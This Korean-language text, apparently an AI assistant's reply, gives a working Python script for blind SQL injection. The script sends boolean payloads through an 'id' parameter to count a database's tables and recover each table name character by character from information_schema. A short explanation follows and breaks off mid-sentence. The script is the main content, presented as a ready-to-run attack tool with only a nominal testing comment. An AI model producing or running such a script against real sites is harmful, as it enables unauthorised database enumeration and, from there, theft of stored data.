SQL 인젝션을 사용해 데이터베이스의 전체 테이블 개수와 테이블 이름을 알아내는 스크립트는 가능합니다. 이전에 설명한 Blind SQL Injection 기법을 기반으로 테이블 정보도 추출할 수 있습니다. 이 과정에서는 information_schema.tables에서 테이블 이름과 개수를 추출하는 SQL 쿼리를 사용하여 정보를 자동으로 수집할 수 있습니다.

다음은 테이블 개수와 테이블 이름을 추출하는 파이썬 자동화 스크립트입니다:

1. 전체 테이블 개수 알아내기

2. 전체 테이블 이름 추출하기

import requests

# 대상 URL 설정
url = "http://example.com/vulnerable_page.php"  # 테스트할 대상 URL
param_name = "id"  # 공격할 파라미터 이름 (예: id)

# 응답이 참인지 거짓인지 판별할 조건 설정 (참일 때의 응답에 나타나는 키워드)
true_response_indicator = "Welcome"  # 참일 때 나타나는 응답 내용 (사용자 환경에 맞게 수정)

# 참/거짓 판별 함수 (응답의 키워드로 참인지 거짓인지 판별)
def is_true_response(response):
    return true_response_indicator in response.text

# 테이블의 개수 추출 함수
def find_table_count():
    for count in range(1, 100):  # 1부터 100까지 테이블 개수를 추측
        payload = f"' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={count}--"
        params = {param_name: payload}
        response = requests.get(url, params=params)

        if is_true_response(response):
            print(f"[+] Number of tables: {count}")
            return count
    return None

# 테이블 이름 추출 함수
def find_table_names(table_count):
    table_names = []
    for index in range(0, table_count):
        table_name = ""
        for i in range(1, 50):  # 테이블 이름의 최대 길이를 50자로 가정
            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {index},1),{i},1)))={char_code}--"
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    table_name += chr(char_code)
                    print(f"[+] Found character: {chr(char_code)} at position {i} for table {index + 1}")
                    break

            # 만약 찾을 문자가 없다면 (즉, 끝에 도달한 경우)
            if char_code == 126 and len(table_name) == i - 1:
                break

        print(f"[+] Table {index + 1} name: {table_name}")
        table_names.append(table_name)
    return table_names

# 메인 실행 함수
if __name__ == "__main__":
    # 1. 테이블 개수 추출
    table_count = find_table_count()

    if table_count:
        # 2. 테이블 이름 추출
        table_names = find_table_names(table_count)
        print(f"[+] Table names: {table_names}")
    else:
        print("[-] Could not find the table count.")

설명:

1. 테이블 개수 추출 (find_table_count()):

이 함수는 information_schema.tables 테이블에서 현재 데이터베이스에 속한 테이블의 개수를 추출하는 SQL 쿼리를 사용합니다.

COUNT(*) 함수로 테이블 개수를 확인한 뒤, 개수를 하나씩 테스트하면서 참/거짓을 판단합니다.

참(True)인 응답을 확인하면 해당 개수를 반환합니다.



2. 테이블 이름 추출 (find_table_names()):

table_schema=database() 조건을 통해 현재 데이터베이스에 속한 테이블 이름을 가져옵니다.

LIMIT 구문을 사용하여 각 테이블을 하나씩 가져오며, 각 테이블 이름의 길이와 문자를 추출하기 위해 SUBSTRING()과 ASCII() 함수를 사용합니다.

ASCII 코드를 하나씩 검사하여 테이블 이름을 유추한 뒤, 모든 테이블 이름을 리스트로 저장합니다.



3. 응답 판별 함수 (is_true_response()):

이전과 동일하게 참(True)인 응답을 식별하기 위해 응답 내에서 특정 키




